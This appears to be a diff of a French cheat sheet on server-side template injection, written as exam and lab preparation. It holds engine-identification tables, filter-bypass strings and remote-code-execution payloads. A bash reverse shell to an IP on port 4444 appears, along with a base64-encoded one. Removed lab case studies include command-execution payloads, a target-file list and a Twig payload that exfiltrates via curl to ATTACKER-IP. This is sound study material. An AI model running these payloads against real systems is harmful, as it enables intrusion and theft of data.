@@ -1,34 +1,19 @@
-# 🎭 FICHE 11 - SERVER-SIDE TEMPLATE INJECTION (SSTI)
-
-## 📋 Table des matières
-
-1. [Moteurs de Templates](#1-moteurs-de-templates)
-2. [Discovery & Identification](#2-discovery--identification)
-3. [Twig (PHP)](#3-twig-php)
-4. [Freemarker (Java)](#4-freemarker-java)
-5. [Pug (JavaScript)](#5-pug-javascript)
-6. [Jinja (Python)](#6-jinja-python)
-7. [Handlebars (JavaScript)](#7-handlebars-javascript)
-8. [Mako (Python)](#8-mako-python)
-9. [EJS (Node.js)](#9-ejs-nodejs)
-10. [Cheat Sheet Rapide](#10-cheat-sheet-rapide)
-
----
+# SERVER-SIDE TEMPLATE INJECTION (SSTI)
 
 ## 1. Moteurs de Templates
 
 ### 1.1 Par Langage
 
-| Engine     | Language    | Side   | RCE Difficulty |
-| ---------- | ----------- | ------ | -------------- |
-| Twig       | PHP         | Server | Medium         |
-| Freemarker | Java        | Server | Easy           |
-| Pug/Jade   | JavaScript  | Server | Medium         |
-| Jinja      | Python      | Server | Hard           |
-| Handlebars | JavaScript  | Both   | Hard           |
-| Mustache   | Multiple    | Varies | Very Hard      |
-| **Mako**   | **Python**  | Server | **Easy**       |
-| **EJS**    | **Node.js** | Server | **Medium**     |
+| Engine | Language | Side   | RCE Difficulty |
+| --- | ------- | ------ | ------ |
+| Twig | PHP     | Server | Medium |
+| Freemarker | Java    | Server | Easy   |
+| Pug/Jade | JavaScript | Server | Medium |
+| Handlebars | JavaScript | Both   | Hard   |
+| EJS | Node.js | Server | Medium |
+| Jinja | Python  | Server | Hard   |
+| Mako | Python  | Server | Easy   |
+| Mustache | Multiple | Varies | Very Hard |
 
 ### 1.2 Syntaxe de Base
 
@@ -895,94 +880,28 @@ ${self.module.cache.util.os.popen('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"').
 
 ### 10.5 Bypass Techniques
 
-|Engine|Filtre|Bypass|
-|---|---|---|
-|Mako|`os`, `system`, `popen`|`str().join(chr(i)for(i)in[105,100])`|
-|EJS|`process`, `require`|`global['pro'+'cess'].mainModule['req'+'uire']`|
-|Freemarker|Espaces, caractères|Base64 + brace expansion `{echo,BASE64}\|{base64,-d}`|
-|Jinja|Double underscores|Utiliser `request` ou `config`|
+| Engine     | Filtre                  | Bypass                                                |
+|------------|-------------------------|-------------------------------------------------------|
+| Mako       | `os`, `system`, `popen` | `str().join(chr(i)for(i)in[105,100])`                 |
+| EJS        | `process`, `require`    | `global['pro'+'cess'].mainModule['req'+'uire']`       |
+| Freemarker | Espaces, caractères     | Base64 + brace expansion `{echo,BASE64}\|{base64,-d}` |
+| Jinja      | Double underscores      | Utiliser `request` ou `config`                        |
 
 ---
 
-## 📝 Notes Importantes
+## 11. Notes Importantes
 
 ### Identification Rapide
 
-|Test|Twig|Jinja|Freemarker|Pug|Mako|EJS|
-|---|---|---|---|---|---|---|
-|`{{ 7*7 }}`|49|49|N/A|N/A|N/A|N/A|
-|`{{ 7*'7' }}`|49|7777777|N/A|N/A|N/A|N/A|
-|`${ 7*7 }`|N/A|N/A|49|N/A|49|N/A|
-|`${ 7*"7" }`|N/A|N/A|Error|N/A|7777777|N/A|
-|`#{ 7*7 }`|N/A|N/A|N/A|`<49>`|N/A|N/A|
-|`<%= 7*7 %>`|N/A|N/A|N/A|N/A|N/A|49|
+| Test          | Twig | Jinja   | Freemarker | Pug    | Mako    | EJS |
+|---------------|------|---------|------------|--------|---------|-----|
+| `{{ 7*7 }}`   | 49   | 49      | N/A        | N/A    | N/A     | N/A |
+| `{{ 7*'7' }}` | 49   | 7777777 | N/A        | N/A    | N/A     | N/A |
+| `${ 7*7 }`    | N/A  | N/A     | 49         | N/A    | 49      | N/A |
+| `${ 7*"7" }`  | N/A  | N/A     | Error      | N/A    | 7777777 | N/A |
+| `#{ 7*7 }`    | N/A  | N/A     | N/A        | `<49>` | N/A     | N/A |
+| `<%= 7*7 %>`  | N/A  | N/A     | N/A        | N/A    | N/A     | 49  |
 
-### Limites Communes
-
-**Twig :**
-
-- Certains filtres peuvent être désactivés
-- sandbox mode peut bloquer system()
-
-**Freemarker :**
-
-- Execute class peut être blacklistée
-- Base64 bypass souvent nécessaire
-
-**Jinja :**
-
-- RCE complexe via **subclasses**
-- Index varie selon l'environnement
-
-**Handlebars :**
-
-- RCE difficile, principalement LFI
-- Dépend des helpers disponibles
-
-**Mako :**
-
-- Filtres sur mots-clés courants (`os`, `system`)
-- Bypass ASCII nécessaire mais efficace
-
-**EJS :**
-
-- Filtres fréquents sur `process`, `require`, `exec`
-- String concatenation bypass très efficace
-
-### Priorités WEB200
-
-1. **Identifier le moteur rapidement** (tests mathématiques + strings)
-2. **Maîtriser Twig, Freemarker, Mako, EJS** (les plus exploitables)
-3. **Connaître les bypasses** :
-    - Base64 (Freemarker)
-    - ASCII/chr (Mako)
-    - String concatenation (EJS)
-4. **Blind exploitation** avec curl/DNS
-5. **Data exfiltration** (Jinja config, Mako self)
-
-### Conseils Pratiques
-
-- **Burp Repeater** pour tester les payloads
-- Toujours **URL encoder** les payloads complexes
-- **Tester plusieurs syntaxes** si le premier test échoue
-- **Noter le moteur identifié** pour exploitation ciblée
-- **Chercher les filtres** en testant des mots-clés suspects
-- Pour **Mako/EJS avec filtres**, penser **bypass immédiatement**
-- **Blind SSTI** : tester avec `curl` vers ton IP d'abord
-
-### Fichiers à Cibler
-
-```
-/flag.txt
-/root/flag.txt
-/root/proof.txt
-/home/*/local.txt
-/var/www/flag.txt
-/etc/passwd
-/app/config.ini
-/.env
-/proc/self/environ
-```
 
 ### Commandes Utiles
 
@@ -999,97 +918,6 @@ echo -n "whoami" | od -A n -t u1 | tr -d ' \n'
 echo "bash -i >& /dev/tcp/192.168.45.204/4444 0>&1" | base64
 ```
 
-**Listener reverse shell :**
 
-```bash
-nc -nvlp 4444
-```
 
----
 
-## 🎯 Case Studies
-
-### Lab Fullmoon (EJS avec filtres)
-
-**URL :** http://fullmoon/  
-**Credentials :** user/password (créer compte)  
-**Endpoint :** Template editor dans les settings
-
-**Filtres identifiés :**
-
-```javascript
-filterTemplate(req, res, next) {
-    req.body.content = req.body.content.replace(/process/g, '');
-    req.body.content = req.body.content.replace(/require/g, '');
-    req.body.content = req.body.content.replace(/exec/g, '');
-    next();
-}
-```
-
-**Payload fonctionnel :**
-
-```javascript
-<%= global['pro'+'cess'].mainModule['req'+'uire']('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString() %>
-```
-
-### Lab Glaucidium (Mako)
-
-**URL :** http://glaudicium/  
-**Credentials :** admin (créer via SSRF + Gopher)  
-**Endpoint :** Formulaire création de news
-
-**Payload fonctionnel :**
-
-```python
-${self.module.cache.util.os.popen('id').read()}
-→ uid=0(root) gid=0(root) groups=0(root)...
-```
-
-**Récupération flags :**
-
-```python
-${self.module.cache.util.os.popen('cat /root/proof.txt').read()}
-```
-
-### Lab Halo (Freemarker)
-
-**URL :** http://halo/admin  
-**Credentials :** admin/password  
-**Endpoint :** Theme editing (404.ftl)
-
-**Payload :**
-
-```freemarker
-${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
-```
-
-### Lab Craft CMS (Twig Blind)
-
-**URL :** http://craft/  
-**SMTP Catcher :** http://craft:8025/
-
-**Blind exploitation :**
-
-```twig
-{% set output %}
-{{[0]|reduce('system','cat /flag.txt')}}
-{% endset %}
-{% set exfil = output| url_encode %}
-{{[0]|reduce('system','curl http://ATTACKER-IP/?exfil=' ~ exfil)}}
-```
-
----
-
-## 🔗 Ressources Utiles
-
-- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
-- **HackTricks SSTI** : https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
-- **Mako Documentation** : https://docs.makotemplates.org/
-- **EJS Documentation** : https://ejs.co/
-- **PortSwigger SSTI** : https://portswigger.net/web-security/server-side-template-injection
-
----
-
-**🎯 Bon courage pour la préparation intensive !**  
-**📅 Période : 26 janvier - 13 mars 2026**  
-**💪 Team Isis - WEB200**
